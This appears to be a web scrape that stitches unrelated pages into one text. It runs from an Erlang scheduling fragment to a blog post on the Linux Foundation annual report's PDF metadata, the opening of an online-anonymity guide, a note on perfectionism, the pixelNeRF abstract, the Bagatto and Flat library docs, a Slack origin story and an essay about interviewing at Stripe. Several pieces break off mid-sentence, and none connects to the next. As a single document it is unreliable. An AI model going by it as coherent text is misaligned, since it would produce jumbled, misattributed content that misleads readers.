<p>There is no great solution in the modern programming language runtime that solves
this problem once and for all. Some language runtimes, like the <a href="https://hamidreza-s.github.io/erlang/scheduling/real-time/preemptive/migration/2016/02/09/erlang-scheduler-details.html">Erlang</a>
preemptive scheduler provide more isolation and control. Unfortunately, Erlang does not solve
the problem of memory management and its isolation comes with a performance cost.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p><a href="https://daniel-lange.com/categories/17-Strategy"><img title="Strategy: Airplanes are interesting toys but of no military value. (Marechal Ferdinand Foch, Professor of Strategy, Ecole Superieure de Guerre)" alt="Strategy" src="https://daniel-lange.com/uploads/strategy.serendipityThumb.jpg"></a></p><p>The Linux Foundation has published its <a href="https://www.linuxfoundation.org/wp-content/uploads/2020/11/2020-Linux-Foundation-Annual-Report_113020.pdf">annual report</a> today. LWN <a href="https://lwn.net/Articles/838871">calls it glossy</a> and yeah, boy, it is shiny.</p>

<p>So shiny that people that work in the publishing industry immediately see this has been produced with the Adobe toolchain which - unfortunately - is one of the big suites of software not yet available for Linux.</p>

<p>Checking the PDF file metadata reveals the keywords "open source, open standards, open hardware, open data". That is what the Linux Foundation is about. Good stuff.</p>

<p><!-- s9ymdb:667 --><img width="552" height="676" src="https://daniel-lange.com/uploads/entries/Linux-Foundation-Annual-Report-2020-cover.jpg" title="Mouseovers are for xkcd!" alt="Linux Foundation annual report 2020 cover"></p>

<p>The PDF producer meta data for the annual report PDF has been set to "Linux kernel 0.12.1 for Workgroups" and the PDF creator meta data element to "Sharp Zaurus XR-5000 (Maemo5) Edition". Somebody thought to better hide the real data and had some tongue-in-cheek ideas. Kudos.</p>

<p>But nicer would have been to use Open Source software to produce the report, not?</p>

<p>Running <code>strings 2020-Linux-Foundation-Annual-Report_113020.pdf | grep Adobe | wc -l</code> gives us 1229 lines and confirms the suspicion of the toolchain.</p>

<p>A stale <code>/Title (Annual Report 2020) /Producer (macOS Version 10.15.7 \(Build 19H15\) Quartz PDFContext)</code> has been forgotten in the document to tell us about the platform.</p>

<p>So, ladies and gentlemen, the Linux Foundation 2020 annual report has been produced on a Mac.</p>

<p>Running Adobe Creative Cloud on MacOS Catalina 10.15.7.</p>

<p>Which is proprietary software. Its kernel (and some userland pieces) are based on BSD. Not Linux.</p>

<hr>

<p>The image on the front page also struck me as a bit odd ... using a ballpoint pen on the laptop screen?</p>

<p>Unbranded laptop.
Unbranded cup in the foreground.</p>

<p>Kid in the background <em>not</em> paying attention to his tablet.</p>

<p>All of that cries stock image so loud it hurts.</p>

<p>Google currently finds ~560 uses of the picture and any <a href="https://www.shutterstock.com/support/article/Do-I-need-to-credit-Shutterstock-the-artist-when-I-use-Images-or-Footage">editorial use</a> nicely tells us that it is © <a href="https://www.shutterstock.com/de/g/draganagordic">Dragana Gordic / Shutterstock</a>.</p>

<p>The image is "Smiling mom working at home with her child on the sofa while writing an email. Young woman working from home, while in quarantine isolation during the Covid-19 health crisis".</p>

<p>See the <a href="https://www.dailymail.co.uk/news/article-8683629/Staff-working-home-nearly-extra-hour-day-research-shows-send-emails.html">Daily Mail</a> for a wonderful example of the working mum in context. I hope, if her laptop had been powered on, it would have run Linux. I mean, what else would still run on an old white MacBook with an Intel "Core 2 Duo" processor from 2008?</p>

<p><!-- s9ymdb:668 --><img width="504" height="742" src="https://daniel-lange.com/uploads/entries/DailyMail-screenshot-stock-image.png" title="O.k., here you go: Shiny, too!" alt="Daily Mail screenshot of the same stock image used"></p>

                </div><div id="extended">
        <p>Bonus round:</p>

<p>The Ethernet port, the USB ports and the headset connector are on the left side of the MacBook. The Daily Mail got it right.</p>

<p>Mirroring images is usually not a good idea. To Linux Foundation's defense ... similar pictures are available <a href="https://www.shutterstock.com/de/image-photo/busy-young-woman-son-home-shot-1680921679">already mirrored on Shutterstuck</a> next to the <a href="https://www.shutterstock.com/de/image-photo/smiling-mom-working-home-her-child-1680923362">correctly oriented picture</a>.</p>

<p>Making a social media account with a pseudonym or artist/brand name is easy. And it’s enough is most use cases to protect your identity as the next George Orwell. There are plenty of people using pseudonyms all over Facebook/Instagram/Twitter/Linkedin/TikTok/Snapchat/Reddit/… But the vast majority of those are anything but anonymous and can easily be traced to their real identity by your local cops, random people within the OSINT<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> (Open-Source Intelligence) community and trolls<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup> on 4chan<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup>.</p>

<p>This is a good thing as most criminals/trolls are not really tech savvy and will be identified with ease. But this is also a bad thing as most political dissidents, human rights activists and whistleblowers can also be tracked rather easily.</p>

<p>This updated guide aims to provide introduction to various tracking techniques, id verification techniques and guidance to creating and maintaining anonymous identities online including social media accounts safely.</p>

<p>Will this guide help you protect yourself from the NSA, the FSB, Mark Zuckerberg or the Mossad if they’re out to find you? Probably not … Mossad will be doing “Mossad things” <sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup> and will probably find you no matter how hard to try to hide<sup id="fnref:5" role="doc-noteref"><a href="#fn:5">5</a></sup>.</p>

<p>You have to consider your threat model<sup id="fnref:6" role="doc-noteref"><a href="#fn:6">6</a></sup> before going further.</p>

<p>Will this guide help you protect your privacy from OSINT researchers like Belingcat<sup id="fnref:7" role="doc-noteref"><a href="#fn:7">7</a></sup> , Doxing<sup id="fnref:8" role="doc-noteref"><a href="#fn:8">8</a></sup> trolls on 4chan<sup id="fnref:9" role="doc-noteref"><a href="#fn:9">9</a></sup> and others that have no access to the NSA toolbox? More likely. Tho I wouldn’t be so sure about 4chan.</p>

<p>It’s also important to understand this guide is the humble result of years of experience and testing from a single individual (myself) and that many of those systems that aim to prevent anonymity are opaque closed-source systems. Most of those guidelines are guessed based on experience. These experiences take a lot of time and resources and are unfortunately far from being scientific. <strong>Your mileage may vary.</strong></p>

<p>You might think this guide has no legitimate use but there are many<sup id="fnref:10" role="doc-noteref"><a href="#fn:10">10</a></sup><sup id="fnref:11" role="doc-noteref"><a href="#fn:11">11</a></sup> such as:</p>

<p>There are many ways you can be tracked besides browser cookies and ads, your e-mail and your phone number. And if you think only the Mossad or the NSA/FSB can find you, you would be terribly wrong.</p>

<p>Here is a non-exhaustive list of some of the many ways you can be de-anonymized:</p>

<h2 id="your-ip-address">Your IP address:</h2>

<p>Your IP address<sup id="fnref:17" role="doc-noteref"><a href="#fn:17">17</a></sup> is the most known and obvious way you can be tracked. That IP is the IP you’re using at the source. This is where you connect to the internet. That IP is usually provided by your ISP (Internet Service Provider) (xDSL, Mobile, Cable, Fiber, Cafe, Bar, Friend, Neighbor). Most countries have data retention regulations<sup id="fnref:18" role="doc-noteref"><a href="#fn:18">18</a></sup> which mandates keeping logs of who is using what IP at a certain time/date for up to several years or indefinitely. Your ISP can tell a third party that you were using a specific IP at a specific date and time, years after the fact. If that IP (the origin one) leaks at any point for any reason, it can be used to track down you directly. In many countries, you won’t be able to have internet access without providing some form of identification to the provider (address, ID, real name, e-mail …).</p>

<p>Useless to say that most platforms (such as social networks) will also keep (sometimes indefinitely) the IP addresses you used to sign-up but also those you used to sign-in.</p>

<p>For those reasons, we’ll need to not use that origin IP (the one tied to your identification) or hide it as much as we can through a combination of various means:</p>

<ul>
  <li>
    <p>Using a public WIFI service (free).</p>
  </li>
  <li>
    <p>Using an anonymous VPN service<sup id="fnref:19" role="doc-noteref"><a href="#fn:19">19</a></sup> (paid by cash).</p>
  </li>
  <li>
    <p>Using the Tor Anonymity Network<sup id="fnref:20" role="doc-noteref"><a href="#fn:20">20</a></sup> (free).</p>
  </li>
</ul>

<p>All those will be explained later in this guide.</p>

<h2 id="your-dns-requests">Your DNS requests:</h2>

<p>DNS stands for “Domain Name System”<sup id="fnref:21" role="doc-noteref"><a href="#fn:21">21</a></sup> and is a service used by your browser (and other apps) to find the IP addresses of a service. It’s pretty much a huge “contact list” (phone book for older people) that works like asking it a name and it returns the number to call. Except it returns an IP instead.</p>

<p>Every time your browser wants to access a certain service such as Google through <a href="https://www.google.com/">https://www.google.com</a>. Your Browser (Chrome or Firefox) will query a DNS service to find the IP addresses of the Google web servers.</p>

<p>Usually the DNS service is provided by your ISP and automatically configured by the network you’re connecting to. This DNS service could also be subject to data retention regulations or will just keep logs for other reasons (data collection for advertising purposes for instance). Therefore this ISP will be capable of …</p></section></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>For me, perfection is that I don't want to have any errors in what I do. It's hard and exhausted to keep everything perfect. When I publish a piece of content, I want it to be perfect. But I always feel something was wrong and afraid someone would point out the error. After all, I just make a little modification and leave it behind because it's wasting time.</p>
<p>I have so much content I want to create. I don't want to stick with a piece of content for too long. When I start creating another piece of content, I try to avoid previous mistakes. I also try something new in it. The joy of creating content is you can try something new and see if it works.</p>
<p>This is the issue that makes me hesitate to create content. I want my content to be useful to my audiences. I also want to create as much content as possible. After trying some ways, I think I should prioritize the quantity rather than quality. Because I can improve my content by creating more. </p>
<p>Now, perfection for me is not the result of a piece of content. It's a process in which I try, modify, and improve pieces by pieces. If I satisfy with a blog post or video, I just publish it and create another. When I find a mistake, I will fix it.</p>

                    We propose pixelNeRF, a learning framework that predicts a continuous neural scene representation conditioned on
                    one or few input images.
                    The existing approach for
                    constructing neural radiance fields&nbsp;<a href="https://www.matthewtancik.com/nerf">[Mildenhall et al. 2020]</a>
                    involves optimizing the representation to every scene independently, requiring many calibrated views and significant compute time.
                    We take a step towards resolving these shortcomings
                    by introducing an architecture that conditions a NeRF on image inputs in a fully convolutional manner. This allows the network to be trained across multiple scenes to learn a scene prior, enabling it to perform novel view synthesis in a feed-forward manner from a sparse set of views (as few as one).

                    Leveraging the volume rendering approach of NeRF, our model can be trained directly from images with no explicit 3D supervision.
                    We conduct extensive experiments on ShapeNet benchmarks for single image novel view synthesis tasks with held-out objects as well as entire unseen categories.
                    We further demonstrate the flexibility of pixelNeRF by demonstrating it on multi-object ShapeNet scenes and real scenes from the DTU dataset. In all cases, pixelNeRF outperforms current state-of-the-art baselines for novel view synthesis and single image 3D reconstruction.

                <h4>Feed-forward NeRF from One View</h4>
                <p>
                    Using multiview image supervision, we train a single pixelNeRF to 13 largest object categories
                    in ShapeNet in order to perform novel-view synthesis on unseen objects.
                    Our approach operates in <strong>view-space</strong>—as opposed to canonical—and requires <strong>no test-time optimization</strong>.
                    Nevertheless, in terms of image metrics, we significantly outperform existing methods quantitatively, as shown in the paper.

                <h4>Scene-level Representation</h4>
                <p>
                    Since our method requires <strong>neither canonical space nor object-level information such as masks</strong>,
                    it can represent scenes with multiple objects, where a canonical space is unavailable,
                    without modification.
                    Our method can also <strong>seemlessly integrate multiple views</strong> at test-time to obtain better results.
                    SRN performs extremely poorly here due to the lack of a consistent canonical space.

                <p>
                    We show that our method can also conduct wide-baseline view synthesis on more complex real scenes from the <a href="http://roboimagedata.compute.dtu.dk/?page_id=36">DTU MVS</a> dataset,
                    producing reasonable results when given only 1-3 views at inference time.
                    Moreover, it is feed-forward without requiring test-time optimization for each scene.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="readme">
    <div>
      <div><h2 id="bagatto"><a href="#bagatto" rel="nofollow noopener">#</a>Bagatto</h2>
<p><img alt="Il Mago" src="https://git.sr.ht/~subsetpark/bagatto/blob/master/logo.jpg"></p>
<h3 id="the-extensible-transparent-static-site-generator"><a href="#the-extensible-transparent-static-site-generator" rel="nofollow noopener">#</a>The extensible, transparent static site generator</h3>
<p>Bagatto is a static site generator written in <a href="https://janet-lang.org/index.html" rel="nofollow noopener">Janet</a>.</p>
<p>It is inspired most directly by Garrett Smith's <a href="https://github.com/gar1t/lambdapad" rel="nofollow noopener">LambdaPad</a>, a SSG
in Erlang. LambdaPad falls more to code side of the config--code
spectrum, and Bagatto follows that philosophy. Thus, it's designed to
expose the full expressive power and extensiblity of the language it's
written in. Janet is a lisp that's designed for simplicity and ease of
embedding, and thus it's a very good fit for this model.</p>
<p>To create a Bagatto website, you should create a single Janet source
file. Because you're writing normal source code, you have the full
power of the Janet language at your disposal. Bagatto tries to keep
the "magic" to a minimum; in all cases, it tries to make the process
of loading source files and of generating new files completely
transparent, inspectable and extensible.</p>
<h3 id="the-model"><a href="#the-model" rel="nofollow noopener">#</a>The Model</h3>
<p>In Bagatto, a website consists of two things: a <strong>data specification</strong>,
and a <strong>site specification</strong>.</p>
<p>A data specification describes all the inputs into the site
generator. These are of two main types: either Janet values or
references to other source files, eg., JSON configuration files or
Markdown articles. When Bagatto evaluates a data specification, it
loads all of the files and parses them for arbitrary
<strong>attributes</strong>. It includes some baseline attributes, like path and
contents, but allows the site author to specify or implement other
attribute parsers. For instance, it comes with a parser function that
will read the YAML frontmatter from a Markdown file and include those
as additional attributes.</p>
<p>Here's an example data specification:</p>
<div><pre><span></span><span>(</span><span>def </span><span>data</span> <span>{</span><span>:config</span> <span>{</span><span>:attrs</span> <span>{</span><span>:title</span> <span>"A Demo Bagatto Config"</span><span>}}</span>
           <span>:posts</span> <span>{</span><span>:src</span> <span>(</span><span>bagatto/slurp-*</span> <span>"posts/*.md"</span><span>)</span>
                   <span>:attrs</span> <span>parse-post</span><span>}</span>
           <span>:static</span> <span>{</span><span>:src</span> <span>(</span><span>bagatto/*</span> <span>"static/*"</span><span>)</span>
                    <span>:attrs</span> <span>bagatto/parse-base</span><span>}</span>
           <span>:config-json</span> <span>{</span><span>:src</span> <span>"config.json"</span>
                         <span>:attrs</span> <span>bagatto/parse-json</span><span>}</span>
           <span>:config-file</span> <span>{</span><span>:src</span> <span>"config.jdn"</span><span>}})</span>
</pre></div>
<p>A site specification describes all of the outputs of the site
generator: the paths and contents of all the files that the generator
should create. For static files like CSS and images, this might be as
simple as copying the original file to a new path. For the generated
content of the website, this will include rendering <strong>templates</strong> by
using the attributes in the input step.</p>
<p>Here's an example site specification:</p>
<div><pre><span></span><span>(</span><span>def </span><span>site</span> <span>{</span><span>:post-index</span> <span>{</span><span>:path</span> <span>index-path</span>
                        <span>:contents</span> <span>render-post-index</span><span>}</span>
           <span>:posts</span> <span>{</span><span>:each</span> <span>:posts</span>
                   <span>:path</span> <span>make-post-path</span>
                   <span>:contents</span> <span>render-post</span><span>}</span>
           <span>:static</span> <span>{</span><span>:each</span> <span>:static</span>
                    <span>:path</span> <span>make-static-path</span><span>}})</span>
</pre></div>
<h3 id="demo"><a href="#demo" rel="nofollow noopener">#</a>Demo</h3>
<p>A demo project can be seen <a href="https://git.sr.ht/~subsetpark/bagatto/tree/refs/heads/master/demo/index.janet" rel="nofollow noopener">in this
repository</a>. This consists of a simple module
which includes some source files and some rendered pages.</p>
<p>To run it, navigate to the demo directory and then run <code>bag</code>:</p>
<pre><code>code-src/bagatto/demo [master !] ⊕ bag index.janet 
site/index.html
site/static/hello.png
site/posts/blog-post-1046213634.html
site/posts/blog-post-778149589.html
</code></pre>
<p>Bagatto outputs the path of each file it copies or creates.</p>
<p>We can then open up <code>site/index.html</code> in a web browser and click
around. Beware: it's pretty ugly. Both <code>index.janet</code> and the template
files it references are very thoroughly commented; hopefully they can
provide a whirlwind introduction.</p>
<h3 id="manual"><a href="#manual" rel="nofollow noopener">#</a>Manual</h3>
<p>See the <a href="https://git.sr.ht/~subsetpark/bagatto/tree/refs/heads/master/MANUAL.md" rel="nofollow noopener">Manual</a> for a deep dive.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>This blog is a part of the series, <strong><em>How to get your first SAAS customer</em></strong>. You can get the book <a href="https://www.firstsaascustomer.com/" data-splitbee-event="Clicked top blog callout link">here</a>.</p></div><div><p>Stewart Butterfield is apparently an expert at turning computer games into businesses — <em>there also might be a hidden strategy in here</em>. I don't mean monetizing games. I mean taking what you've learned or built with a video game, and building a business off of it. Stewart has founded two massively successful online companies, both of which originated from (or were a product of) video games Stewart and some friends were working on.</p><p>First, Stewart was working on a game called Game Never Ending, which had a very popular photo sharing feature. He then went and built Flikr, the photo sharing app, which he sold shortly after.</p><p>As his next endeavour he and his colleagues decided to start working on an online multiplayer game that was described as "A mix between world of war craft, super mario, and a splash of Doctor Suess". His team was split between a couple cities and they were unsatisfied with their remote communication.</p><p>Stewart built an internal tool so he could chat within anyone on the team, no matter where they were. He realized that this was pretty valuable in and of itself.</p><p>‍</p><figure id="w-node-5e20e900fc9d-c9bb4729"><p><img src="https://assets.website-files.com/5fbed83c9b5bca1ced485e3a/5fc148fcc755c6585611d022_Slack1.png" loading="lazy" alt=""></p><figcaption>Stewart coming up with the SLACK name</figcaption></figure><p>‍</p><p>‍</p><p>‍</p><blockquote>[Internet Relay Chat] has this one fundamental concept called a 'channel' and you send messages to the channel rather than to individuals or to groups of individuals as you do in e-mail or most messaging systems. It’s a fundamental shift because the channel can exist before you arrive and it can exist after you leave, you can look into other channels across the system. When you join the organization, whether it’s the next day or six months later or five years later, all of that stuff is archived in all these different channels. And we slowly, over the course of years, built feature after feature, solved the really irritating problems, took advantage of the obvious opportunities. So now fast forward to 2012 at the end of the year, it was apparent that the game wasn’t going to work, like it just wasn’t going to be viable, it was never going to be the kind of business that would justify the $17 million bucks or venture capital investment we had raised, but we all realized we would never work without a system like this one again and so thought that it might be something that the rest of the world would want," Butterfield says in an interview in 2017.<p><strong>— Steward reflecting on the Slack technology</strong></p></blockquote><p>‍</p><p>After almost 3 years of working on a game, with no encouraging traction, Stewart and team switched to working on Slack.</p><p>The team knew quite a few other friends and old colleagues who worked at other startups. They reached out and begged them to try Slack.</p><p>‍</p><figure><p><img src="https://assets.website-files.com/5fbed83c9b5bca1ced485e3a/5fc14911e38b234d33329445_Slack2.png" loading="lazy" alt=""></p><figcaption>The first slack website</figcaption></figure><p>‍</p><p>‍</p><p>‍</p><p>What separated the Slack team from everyone else was their internal focus on growth. They were fully prepared to make small or large changes, advances, or pivots — evidenced by the huge pivot from a game they had been working on for 3 years to a chat app — to make customers happy.</p><p>Companies had email, phone, and other IRC technology, but Slack made it delightful. They solved the problems they already knew distributed teams were facing. It was baked right into the company name, Searchable Log of All Conversation and Knowledge (SLACK).</p><p>Slack made customer feedback the epicenter of its efforts. They made sure customers were heard, serviced, and supported. Slack worked day and night to fix issues, release improvements, and build the features their customers needed.</p><p>When Slack noticed issues with product adoption at a whole or user adoption within a company, they quickly identified the root cause and developer clever solutions. For example, Slack noticed that new hired when added to a Slack team had difficulty knowing which channels to join (There were usually many), so Slack developed channel descriptions and showed how many people were a part of and using each channel.</p><p>Slack made it dead simple for individuals to convince the rest of their team that they needed Slack, “We created materials to explain Slack to individuals" Stewart said. They explained what it was for, how it worked, what you’re supposed to do. "We also built resources for team administrators. We wanted to give them ammunition to help convince the team", Butterfield says.</p><p>A lot of promotion and ground work was done by their customers. From there, Slack's internal focus on growth, customer feedback, and iteration propelled them into the market.</p><p><strong>Takeaways from Slack</strong></p><ol role="list"><li>Make user feedback your core focus</li><li>Help users to convince themselves and teammates/colleagues/friends</li><li>Pay attention to key user problems</li></ol><p>‍</p></div></div>]]>

		<h4>Flat — Generative infrastructure for Python</h4><p>Flat is a library for creating and manipulating digital forms of fine arts. Its aim is to enable experimentation with and testing of unpredictable or automated processes, to inspect the beginning of the "new".</p><p>It grew out of the needs for generative design, architecture and art. The concept of "design" is more of a subject of study yet to be delved into, hence the fitter term for subtitle is "infrastructure".</p><p>It is written in pure Python and distributed under a liberal license.</p><h4>Content</h4><ul><li><a href="#features">Features</a></li><li><a href="#concepts">Core concepts</a></li><li><a href="#tutorial">Tutorial</a></li><li><a href="#examples">Examples</a></li><li><a href="#reference">API reference</a></li><li><a href="#installation">Installation</a></li><li><a href="#source">Source code</a></li><li><a href="#history">Previous releases</a></li><li><a href="#contact">Contact</a></li></ul><h4><a name="features"></a>Features</h4><ul><li><strong>Graphic formats</strong><ul><li>PNG, JPEG, PDF, SVG, OpenType (both TrueType and PostScript outlines), STL</li></ul></li><li><strong>Color spaces</strong><ul><li>grayscale, grayscale + alpha, RGB, RGBA, CMYK, spot colors, overprint</li></ul></li><li><strong>Image manipulation</strong><ul><li>resizing, blurring, dithering, ...</li></ul></li><li><strong>Image synthesis</strong><ul><li>Bezier path rasterization, BVH accelerated path tracing with explicit emitters and stratified sampling</li></ul></li><li><strong>Vector graphic primitives</strong><ul><li>line, polyline, ..., path, text, outlines, groups and units</li></ul></li><li><strong>Typography</strong><ul><li>kerning, greedy line breaking, threaded text frames</li></ul></li><li><strong>Computational geometry</strong><ul><li>Boolean operation on polygons</li></ul></li><li><strong>Data visualization</strong><ul><li>tree layout</li></ul></li></ul><h4><a name="concepts"></a>Core concepts</h4><p>Flat library consists of three (slightly overlapping) parts: image, document and scene.
An image is basically a container of pixels and a color kind. There are a few methods which operate over those pixels, such as "blur" or "put".
It is possible to create completely new image, by opening a file or by "rasterizing" a page of document.</p><p>Document is then assembled from pages, and each page holds number of "placed" items, both of which can be exported, too.
Here it also makes sense to introduce other entities: colors, shapes and strikes. There is support for following colors or color spaces, if you will:
the usual ones (grayscale, RGB, CMYK, ...), spot colors that can be used for controlling the application of special colorants and "overprint", which allows for printing of a graphic figure without erasing anything below it.
A shape includes both graphical properties such as stroke width or miter limit and means of creating items with said properties that are to be "placed" into a page, for example "line" or "circle".
Strike is a similar combination of text attributes (font, size, color, ...) and a way of constructing text "spans". A span likewise connects text string to text attributes, one or more spans can form a "paragraph", which in turn may form "text" or "outlines". Outlines are similar to texts but they use paths of glyph outlines, instead of characters.
One additional thing to note is that placed texts or outlines may be linked into a story or "chain" of blocks, making the text gradually "flow" from one text frame to another.
Any of the items may be placed into a "group" as well.</p><p>Finally, a scene is made of (possibly light emitting) materials, meshes built of triangular faces defined by "triplets" of 3D vertices and a camera.</p><h4><a name="tutorial"></a>Tutorial</h4><pre><code>from flat import rgb, font, shape, strike, document

red = rgb(255, 0, 0)
lato = font.open('Lato-Reg.otf')
figure = shape().stroke(red).width(2.5)
headline = strike(lato).color(red).size(20, 24)

d = document(100, 100, 'mm')
p = d.addpage()
p.place(figure.circle(50, 50, 20))
p.place(headline.text('Hello world!')).frame(10, 10, 80, 80)
p.image(kind='rgb').png('hello.png')
p.svg('hello.svg')
d.pdf('hello.pdf')
</code></pre><p>Short commentary:</p><p>We first prepared some invariants which we are going to use later, like the body typeface, some RGB color or a typeface we opened from a font file. One can think of <code>shape</code> and <code>strike</code> as of customizable factories which produce more concrete objects, for example lines or spans of text.</p><p>Next is the basic document hierarchy with just one page that can have items be placed into. The origin of coordinate system (0, 0) is at the top left corner and most of the time the default unit is "points" (1 inch = 72 points). A placed item may have some additional properties as position or <code>frame</code>. The latter is used to define the boundaries inside whose the text may run. As Flat currently lacks any kind of color management, we need to use the same color space for rasterizing the page into a PNG file. To access a page at any time one can simply keep a reference to it (<code>p</code>). Lastly, note that PDF is one of the few graphic formats which can hold multiple pages.</p><h4><a name="examples"></a>Examples</h4><p>There is also a public <a href="https://github.com/xxyxyz/flat-examples">repository</a> hosting additional examples.</p><h4><a name="reference"></a>API reference</h4><h4>image.py</h4><ul><li><strong><code>image.open(</code></strong><code>path</code><strong><code>)</code></strong><ul><li><ul><li>Open an image located at <code>path</code>.

<p>Interviewing for a job often is a daunting experience. It may commonly be described as a two-way selection process, one in which the candidate is evaluating the company as much as the company is the candidate, but the sober truth is that outside of the most highly sought-after segments of the talent pool, the balance of power resides squarely with the hiring company and the candidate has little leverage until the moment a job offer is presented. This seemingly is especially true in Silicon Valley, where each job opening routinely attracts hundreds of applicants and it is not uncommon that the candidate simply never hears back from the company in the case the interview is deemed unsuccessful at any point along the process, without even a notice of rejection, let alone being provided an explanation or feedback of any kind. Basic decency and decorum can seem to fly out the window once the company makes the determination you are “not a fit,” which effectively translates to “henceforth a waste of time,” simply an undesired byproduct of an essential process, to be discarded as quickly as possible.</p>



<p>But every once in a while, as is the case with life in general, an exception comes along that runs against the grain of your learned expectations. It shows you the extraordinary does exist and offers a reminder that much of what happens in this world lies on a distribution, despite the seeming tyranny of what occupy the regions of central tendency. While it won’t negate the broadly observed norms, the reminder that excellence exists in almost all domains of human activity sometimes is enough to sustain one in a journey that is full of pitfalls and trials, providing the inspiration that helps keep alive hopes and aspirations even when the objective and dispassionate prognosis appears far from welcoming. Interviewing with Stripe, the payment startup, for me, was such an example.</p>



<p>My very first interview with Stripe started off quite inauspiciously. It was a phone interview with the recruiter, and after spending some time to explore and discuss both my background and that of the job, he let me know that my skill set probably was not as good a match for what the hiring team was looking for as initially thought. In retrospect that sort of upfront candor might have been an early indication of the caliber of the organization that was to be revealed more fully later on. But the remarkable thing that happened after he uttered that assessment was that he wanted to refer me to another recruiter, for a different role which he thought presented a better match. This was something that quite literally had never happened in my experience, admittedly a small sample as it may be – a recruiter that not only was well-versed enough in another position for which he was not recruiting, was empowered enough by the organization to make that kind of an autonomous referral decision without consultation, but also, probably most impressively, cared enough to take on such an initiative when I was deemed no longer useful for his immediate need, which was to fill the position at hand.</p>



<p>The subsequent interviews, for the new role, went more smoothly, uneventfully in the best sense. Over the course of the ensuing few weeks, in succession, I had a phone call with the new recruiter, a Zoom video call with the head of the business unit for the role (who was based overseas), a writing assignment, and in-person coffee shop chats in San Francisco with the said head of the business unit who happened to be in town that week and also with the hiring manager. All of that led to culminate in an on-site round of interviews with 7 individuals that lasted over 4 hours in January of this year at the San Francisco headquarters of Stripe.</p>



<p>In retrospect, it is clear I did not perform as well on the on-site interviews as I should have. What was unique about Stripe was the interview questions were actually provided in advance – the recruiter arranged a call with me prior to the scheduled date to go over the questions one by one. Gripped by the notion, somehow, that interviews are just conversations, however, I did not spend a lot of time preparing specific answers for those questions. Looking back, I now think a big part of the reason why was hubris; I have a tendency to think I enjoy all conversations, and proceeded to draw the conclusion in my mind that conversations I enjoy in an interview setting must be good interviews. The mere fact that I was ready to enjoy the interviews, in their natural, unscripted, conversational formulation, was, in a way, enough preparation. But once the on-site interviews began it became apparent the interviewers were pressing for a higher level of specificity in the answers than I was prepared to give in the courses of casual conversations. I could feel the inadequacy of my answers resulting from the lack of deeper considerations given them in advance, and I simply was not good enough to get to the level of detailed thoughtfulness on the spot. As I was ushered out of the building after the interviews concluded, I recall feeling a sense of regretful uneasiness creeping in. Almost compulsively, I remained hopeful, but far from confident. And surely enough, a few days later I was informed that I didn’t get the job. </p>



<p>I was devastated, but this is the point from which I was led to Stripe revealing itself to be a truly unique, unconventional company in the most unexpectedly wonderful ways. First, the recruiter offered to schedule a call so we could review the decision. I was pleasantly surprised to be given such an unusual opportunity, so I took him up on it. During the call he relayed some useful feedback, though it is clear in retrospect that I got too excited to be on such a call and spent way more time talking than listening to what he had to say. But importantly, the conversation helped me come to a realization, in concrete ways, that I was a much worse interviewee than had previously believed myself to be. It prompted me to ex-examine my natural tendencies in the ways I think, talk, and engage with others in conversations. When I shared the revelation with my wife, she was more than happy to supply additional pointers in areas of my failing.</p>



<p>The fact that the recruiter, and by extension the company, was willing to engage with and spend the time and effort on someone deemed to be “not wanted” was an enormous departure from everything I had experienced previously. Frankly, it was the kind of thoughtfulness and generosity of goodwill that I never expected any corporate entity to possess or display. I knew I had been rejected, but now I wanted Stripe even more, and I couldn’t let myself just give up. So I did something quite silly: I sent an email to the CEO. Fortunately Patrick Collison, Stripe’s CEO, lists his email address on his personal website. But I had no idea if the email would actually reach him, or if he would read it if it got to him, or if he would respond in any way. The overwhelmingly realistic outcome was that nothing would happen, and I knew it. It was a desperation move, one you are able to make only because you have nothing to lose.</p>



<p>Then, I got an email from the recruiter. He asked if I wanted to speak with the company’s chief risk officer – the job I interviewed for was a risk function – for reasons that were not entirely clear. He mentioned I might want “a bit more closure,” but I didn’t want closure; if anything, I wanted to keep the door ajar as much and as long as possible. He also said that the meeting was optional, with “no pressure.” Perplexed yet intrigued, I took up the opportunity to speak with the executive. She began the call with something to the effect of “I know you reached out to Patrick.” I had reached out to everyone I had interviewed with to solicit feedback, and since the name “Patrick” didn’t register right away I processed it to mean one of the interviewers. But about 5 seconds later I realized there was no one named Patrick that I had met, and then it hit me that it must be Patrick Collison, the CEO. My email to him was why this call was happening, which the chief risk officer confirmed when I asked her in disbelief. I was stunned. Having taken place almost a half year ago, much of the details of the call is a blur. But I recall distinctly her asking why Stripe should hire someone like myself. Most improbably, it seemed, this might be a second chance.</p>



<p>I had written to Patrick the CEO with a proposition: I offered myself to be a counterfactual data point in an evaluation of Stripe’s hiring process, after learning that Stripe’s credit card fraud detection system lets through some transactions which its algorithms flag as likely frauds in order to determine whether they turn out to be true positives or false positives – thereby evaluating the algorithms themselves – in a process called “counterfactual evaluation.” When the chief risk officer asked why I should be hired, I reiterated that proposition: the case I was making was not about my merits, but the willingness on Stripe’s part to apply counterfactual evaluation to its hiring process, to determine whether I was a false positive (incorrectly rejected) or a true positive (truly no good) by letting me join Stripe, without a bias to either outcome. I couldn’t tell if I was making any headway with the argument, but we soon ran out of time and she had to go to another meeting.</p>



<p>In the end, the outcome of my interviews did not change and I remain not an employee of Stripe. But out of all the job interview experiences I’ve had in my life, the one with Stripe stands out as singularly remarkable. When I shared my story with a friend she was so impressed that even though she wasn’t looking for a new job, she said she still might apply to Stripe just for the experience. Today Stripe has earned a reputation as one of the best embodiments of the ideals of Silicon Valley – a place of inventive and ambitious companies that not only come up …</p></div></div>

